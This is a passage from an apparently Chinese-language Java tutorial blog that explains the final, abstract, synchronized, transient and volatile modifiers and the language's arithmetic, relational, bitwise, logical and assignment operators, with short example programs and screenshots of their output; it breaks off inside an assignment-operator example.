方法的主要目的是防止该方法的内容被修改。</p><p>如下所示，使用 final 修饰符声明方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">changeName</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="comment">// 方法体</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>final 类</strong></p><p>final 类不能被继承，没有类能够继承 final 类的任何特性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 类体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="abstract-修饰符"><a href="#abstract-修饰符" class="headerlink" title="abstract 修饰符"></a>abstract 修饰符</h3><p><strong>抽象类：</strong></p><p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。</p><p><strong>一个类不能同时被 abstract 和 final 修饰</strong>。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。</p><p>抽象类可以包含抽象方法和非抽象方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Carbvan</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> String model;</span><br><span class="line">    <span class="keyword">private</span> String year;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">goFast</span><span class="params">()</span></span>;<span class="comment">//抽象方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">changeColor</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>抽象方法</strong></p><p>抽象方法是一种没有任何实现的方法，该方法的具体实现由子类提供。</p><p><strong>抽象方法不能被声明成 final 和 static</strong>。</p><p>任何继承抽象类的子类必须实现父类的所有抽象方法，除非该子类也是抽象类。</p><p>如果一个类包含若干个抽象方法，那么该类必须声明为抽象类。抽象类可以不包含抽象方法。</p><p><strong>抽象方法的声明以分号结尾</strong>，例如：**public abstract sample();**。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SuperClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span></span>; <span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">SuperClass</span></span>&#123;</span><br><span class="line">     <span class="comment">//实现抽象方法</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">m</span><span class="params">()</span></span>&#123;</span><br><span class="line">          .........</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="synchronized-修饰符"><a href="#synchronized-修饰符" class="headerlink" title="synchronized 修饰符"></a>synchronized 修饰符</h3><p>synchronized 关键字声明的方法<strong>同一时间只能被一个线程访问</strong>。synchronized 修饰符可以应用于四个访问修饰符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">showDetails</span><span class="params">()</span></span>&#123;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="transient-修饰符"><a href="#transient-修饰符" class="headerlink" title="transient 修饰符"></a>transient 修饰符</h3><p>序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。</p><p>该修饰符包含在定义变量的语句中，用来预处理类和变量的数据类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">transient</span> <span class="keyword">int</span> limit = <span class="number">55</span>;   <span class="comment">// 不会持久化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> b; <span class="comment">// 持久化</span></span><br></pre></td></tr></table></figure><h3 id="volatile-修饰符"><a href="#volatile-修饰符" class="headerlink" title="volatile 修饰符"></a>volatile 修饰符</h3><p>volatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。</p><p>一个 volatile 对象引用可能是 null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> active;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        active = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (active) <span class="comment">// 第一行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 代码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        active = <span class="keyword">false</span>; <span class="comment">// 第二行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下，在一个线程调用 run() 方法（在 Runnable 开启的线程），在另一个线程调用 stop() 方法。 如果 <strong>第一行</strong> 中缓冲区的 active 值被使用，那么在 <strong>第二行</strong> 的 active 值为 false 时循环不会停止。</p><p>但是以上代码中我们使用了 volatile 修饰 active，所以该循环会停止。</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>运算符分成以下几类：</p><ul><li>算术运算符</li><li>关系运算符</li><li>位运算符</li><li>逻辑运算符</li><li>赋值运算符</li><li>其他运算符</li></ul><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><p>表格中的实例假设整数变量A的值为10，变量B的值为20：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法 - 相加运算符两侧的值</td><td align="left">A + B 等于 30</td></tr><tr><td align="left">-</td><td align="left">减法 - 左操作数减去右操作数</td><td align="left">A – B 等于 -10</td></tr><tr><td align="left">*</td><td align="left">乘法 - 相乘操作符两侧的值</td><td align="left">A * B等于200</td></tr><tr><td align="left">/</td><td align="left">除法 - 左操作数除以右操作数</td><td align="left">B / A等于2</td></tr><tr><td align="left">％</td><td align="left">取余 - 左操作数除以右操作数的余数</td><td align="left">B%A等于0</td></tr><tr><td align="left">++</td><td align="left">自增: 操作数的值增加1</td><td align="left">B++ 或 ++B 等于 21</td></tr><tr><td align="left">–</td><td align="left">自减: 操作数的值减少1</td><td align="left">B– 或 –B 等于 19</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">     <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">     <span class="keyword">int</span> c = <span class="number">25</span>;</span><br><span class="line">     <span class="keyword">int</span> d = <span class="number">25</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;a + b = &quot;</span> + (a + b) );</span><br><span class="line">     System.out.println(<span class="string">&quot;a - b = &quot;</span> + (a - b) );</span><br><span class="line">     System.out.println(<span class="string">&quot;a * b = &quot;</span> + (a * b) );</span><br><span class="line">     System.out.println(<span class="string">&quot;b / a = &quot;</span> + (b / a) );</span><br><span class="line">     System.out.println(<span class="string">&quot;b % a = &quot;</span> + (b % a) );</span><br><span class="line">     System.out.println(<span class="string">&quot;c % a = &quot;</span> + (c % a) );</span><br><span class="line">     System.out.println(<span class="string">&quot;a++   = &quot;</span> +  (a++) );</span><br><span class="line">     System.out.println(<span class="string">&quot;a--   = &quot;</span> +  (a--) );</span><br><span class="line">     <span class="comment">// 查看  d++ 与 ++d 的不同</span></span><br><span class="line">     System.out.println(<span class="string">&quot;d++   = &quot;</span> +  (d++) );</span><br><span class="line">     System.out.println(<span class="string">&quot;++d   = &quot;</span> +  (++d) );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509184313.png"></p><p>以上实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509184233.png"></p><h3 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h3><p><strong>1、自增（++）自减（–）运算符</strong>是一种特殊的算术运算符，在算术运算符中需要两个操作数来进行运算，而自增自减运算符是一个操作数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">selfAddMinus</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">3</span>;<span class="comment">//定义一个变量；</span></span><br><span class="line">        <span class="keyword">int</span> b = ++a;<span class="comment">//自增运算</span></span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> d = --c;<span class="comment">//自减运算</span></span><br><span class="line">        System.out.println(<span class="string">&quot;进行自增运算后的值等于&quot;</span>+b);</span><br><span class="line">        System.out.println(<span class="string">&quot;进行自减运算后的值等于&quot;</span>+d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509184454.png"></p><ul><li>int b = ++a; 拆分运算过程为: a=a+1=4; b=a=4, 最后结果为b=4,a=4</li><li>int d = –c; 拆分运算过程为: c=c-1=2; d=c=2, 最后结果为d=2,c=2</li></ul><p>运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509184516.png"></p><p><strong>2、前缀自增自减法(++a,–a):</strong> 先进行自增或者自减运算，再进行表达式运算。</p><p><strong>3、后缀自增自减法(a++,a–):</strong> 先进行表达式运算，再进行自增或者自减运算 实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">selfAddMinus</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">2</span>*++a;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">2</span>*b++;</span><br><span class="line">        System.out.println(<span class="string">&quot;自增运算符前缀运算后a=&quot;</span>+a+<span class="string">&quot;,x=&quot;</span>+x);</span><br><span class="line">        System.out.println(<span class="string">&quot;自增运算符后缀运算后b=&quot;</span>+b+<span class="string">&quot;,y=&quot;</span>+y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092134309.png"></p><p>运行结果是：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092136572.png"></p><h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><p>下表为Java支持的关系运算符，表格中的实例整数变量A的值为10，变量B的值为20：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">检查如果两个操作数的值是否相等，如果相等则条件为真。</td><td align="left">（A == B）为假。</td></tr><tr><td align="left">!=</td><td align="left">检查如果两个操作数的值是否相等，如果值不相等则条件为真。</td><td align="left">(A != B) 为真。</td></tr><tr><td align="left">&gt;</td><td align="left">检查左操作数的值是否大于右操作数的值，如果是那么条件为真。</td><td align="left">（A&gt; B）为假。</td></tr><tr><td align="left">&lt;</td><td align="left">检查左操作数的值是否小于右操作数的值，如果是那么条件为真。</td><td align="left">（A &lt;B）为真。</td></tr><tr><td align="left">&gt;=</td><td align="left">检查左操作数的值是否大于或等于右操作数的值，如果是那么条件为真。</td><td align="left">（A&gt; = B）为假。</td></tr><tr><td align="left">&lt;=</td><td align="left">检查左操作数的值是否小于或等于右操作数的值，如果是那么条件为真。</td><td align="left">（A &lt;= B）为真。</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">       <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">       System.out.println(<span class="string">&quot;a == b = &quot;</span> + (a == b) );</span><br><span class="line">       System.out.println(<span class="string">&quot;a != b = &quot;</span> + (a != b) );</span><br><span class="line">       System.out.println(<span class="string">&quot;a &gt; b = &quot;</span> + (a &gt; b) );</span><br><span class="line">       System.out.println(<span class="string">&quot;a &lt; b = &quot;</span> + (a &lt; b) );</span><br><span class="line">       System.out.println(<span class="string">&quot;b &gt;= a = &quot;</span> + (b &gt;= a) );</span><br><span class="line">       System.out.println(<span class="string">&quot;b &lt;= a = &quot;</span> + (b &lt;= a) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092142096.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092144632.png"></p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>Java定义了位运算符，应用于整数类型(int)，长整型(long)，短整型(short)，字符型(char)，和字节型(byte)等类型。</p><p>位运算符作用在所有的位上，并且按位运算。假设a = 60，b = 13;它们的二进制格式表示将如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = <span class="number">0011</span> <span class="number">1100</span></span><br><span class="line">B = <span class="number">0000</span> <span class="number">1101</span></span><br><span class="line">-----------------</span><br><span class="line">A&amp;B = <span class="number">0000</span> <span class="number">1100</span></span><br><span class="line">A | B = <span class="number">0011</span> <span class="number">1101</span></span><br><span class="line">A ^ B = <span class="number">0011</span> <span class="number">0001</span></span><br><span class="line">~A = <span class="number">1100</span> <span class="number">0011</span></span><br></pre></td></tr></table></figure><p>下表列出了位运算符的基本运算，假设整数变量 A 的值为 60 和变量 B 的值为 13：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">＆</td><td align="left">如果相对应位都是1，则结果为1，否则为0</td><td align="left">（A＆B），得到12，即0000 1100</td></tr><tr><td align="left">|</td><td align="left">如果相对应位都是 0，则结果为 0，否则为 1</td><td align="left">（A | B）得到61，即 0011 1101</td></tr><tr><td align="left">^</td><td align="left">如果相对应位值相同，则结果为0，否则为1</td><td align="left">（A ^ B）得到49，即 0011 0001</td></tr><tr><td align="left">〜</td><td align="left">按位取反运算符翻转操作数的每一位，即0变成1，1变成0。</td><td align="left">（〜A）得到-61，即1100 0011</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">按位左移运算符。左操作数按位左移右操作数指定的位数。</td><td align="left">A &lt;&lt; 2得到240，即 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">按位右移运算符。左操作数按位右移右操作数指定的位数。</td><td align="left">A &gt;&gt; 2得到15即 1111</td></tr><tr><td align="left">&gt;&gt;&gt;</td><td align="left">按位右移补零操作符。左操作数的值按右操作数指定的位数右移，移动得到的空位以零填充。</td><td align="left">A&gt;&gt;&gt;2得到15即0000 1111</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> a = <span class="number">60</span>; <span class="comment">/* 60 = 0011 1100 */</span> </span><br><span class="line">       <span class="keyword">int</span> b = <span class="number">13</span>; <span class="comment">/* 13 = 0000 1101 */</span></span><br><span class="line">       <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">       c = a &amp; b;       <span class="comment">/* 12 = 0000 1100 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a &amp; b = &quot;</span> + c );</span><br><span class="line">   </span><br><span class="line">       c = a | b;       <span class="comment">/* 61 = 0011 1101 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a | b = &quot;</span> + c );</span><br><span class="line">   </span><br><span class="line">       c = a ^ b;       <span class="comment">/* 49 = 0011 0001 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a ^ b = &quot;</span> + c );</span><br><span class="line">   </span><br><span class="line">       c = ~a;          <span class="comment">/*-61 = 1100 0011 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;~a = &quot;</span> + c );</span><br><span class="line">   </span><br><span class="line">       c = a &lt;&lt; <span class="number">2</span>;     <span class="comment">/* 240 = 1111 0000 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a &lt;&lt; 2 = &quot;</span> + c );</span><br><span class="line">   </span><br><span class="line">       c = a &gt;&gt; <span class="number">2</span>;     <span class="comment">/* 15 = 1111 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a &gt;&gt; 2  = &quot;</span> + c );</span><br><span class="line">    </span><br><span class="line">       c = a &gt;&gt;&gt; <span class="number">2</span>;     <span class="comment">/* 15 = 0000 1111 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;a &gt;&gt;&gt; 2 = &quot;</span> + c );</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092149135.png"></p><p>以上实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092152042.png"></p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>下表列出了逻辑运算符的基本运算，假设布尔变量A为真，变量B为假。</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">称为逻辑与运算符。当且仅当两个操作数都为真，条件才为真。</td><td align="left">（A &amp;&amp; B）为假。</td></tr><tr><td align="left">| |</td><td align="left">称为逻辑或操作符。如果任何两个操作数任何一个为真，条件为真。</td><td align="left">（A | | B）为真。</td></tr><tr><td align="left">！</td><td align="left">称为逻辑非运算符。用来反转操作数的逻辑状态。如果条件为true，则逻辑非运算符将得到false。</td><td align="left">！（A &amp;&amp; B）为真。</td></tr></tbody></table><p><strong>实例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> a = <span class="keyword">true</span>;</span><br><span class="line">     <span class="keyword">boolean</span> b = <span class="keyword">false</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;a &amp;&amp; b = &quot;</span> + (a&amp;&amp;b));</span><br><span class="line">     System.out.println(<span class="string">&quot;a || b = &quot;</span> + (a||b) );</span><br><span class="line">     System.out.println(<span class="string">&quot;!(a &amp;&amp; b) = &quot;</span> + !(a &amp;&amp; b));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092200704.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092200715.png"></p><h3 id="短路逻辑运算符"><a href="#短路逻辑运算符" class="headerlink" title="短路逻辑运算符"></a>短路逻辑运算符</h3><p>当使用与逻辑运算符时，在两个操作数都为true时，结果才为true，但是当得到第一个操作为false时，其结果就必定是false，这时候就不会再判断第二个操作了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LuoJi</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">boolean</span> b = (a&lt;<span class="number">4</span>)&amp;&amp;(a++&lt;<span class="number">10</span>);</span><br><span class="line">        System.out.println((<span class="string">&quot;使用短路逻辑运算符的结果为: &quot;</span> + b));</span><br><span class="line">        System.out.println(<span class="string">&quot;a的结果为:  &quot;</span> + a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092254627.png"></p><p>运行结果为： </p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305092255266.png"></p><p><em>该程序使用到了短路逻辑运算符(&amp;&amp;)，首先判断 a&lt;4 的结果为 false，则 b 的结果必定是 false，所以不再执行第二个操作 a++&lt;10 的判断，所以 a 的值为 5。</em></p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>下面是Java语言支持的赋值运算符：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符，将右操作数的值赋给左侧操作数</td><td align="left">C = A + B将把A + B得到的值赋给C</td></tr><tr><td align="left">+ =</td><td align="left">加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数</td><td align="left">C + = A等价于C = C + A</td></tr><tr><td align="left">- =</td><td align="left">减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数</td><td align="left">C - = A等价于C = C - A</td></tr><tr><td align="left">* =</td><td align="left">乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数</td><td align="left">C * = A等价于C = C * A</td></tr><tr><td align="left">/ =</td><td align="left">除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数</td><td align="left">C / = A，C 与 A 同类型时等价于 C = C / A</td></tr><tr><td align="left">（％）=</td><td align="left">取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数</td><td align="left">C％= A等价于C = C％A</td></tr><tr><td align="left">&lt;&lt; =</td><td align="left">左移位赋值运算符</td><td align="left">C &lt;&lt; = 2等价于C = C &lt;&lt; 2</td></tr><tr><td align="left">&gt;&gt; =</td><td align="left">右移位赋值运算符</td><td align="left">C &gt;&gt; = 2等价于C = C &gt;&gt; 2</td></tr><tr><td align="left">＆=</td><td align="left">按位与赋值运算符</td><td align="left">C＆= 2等价于C = C＆2</td></tr><tr><td align="left">^ =</td><td align="left">按位异或赋值操作符</td><td align="left">C ^ = 2等价于C = C ^ 2</td></tr><tr><td align="left">| =</td><td align="left">按位或赋值操作符</td><td align="left">C | = 2等价于C = C | 2</td></tr></tbody></table><p><strong>实例</strong></p><p>下面的简单示例程序演示了赋值运算符。复制并粘贴下面的Java程序并保存为Test.java文件，然后编译并运行这个程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span 